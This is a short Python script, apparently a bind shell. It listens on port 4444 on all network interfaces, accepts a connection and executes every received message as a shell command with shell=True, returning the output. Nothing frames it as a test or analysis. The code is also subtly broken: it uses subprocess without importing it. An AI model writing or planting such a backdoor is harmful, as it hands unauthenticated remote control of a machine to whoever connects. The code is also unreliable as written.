import socket

HOST = '0.0.0.0'
PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)

conn, addr = s.accept()
print(f'Connected by {addr}')

# Redirect input/output to the socket
while True:
    data = conn.recv(1024)
    if not data:
        break
    conn.sendall(subprocess.check_output(data, shell=True))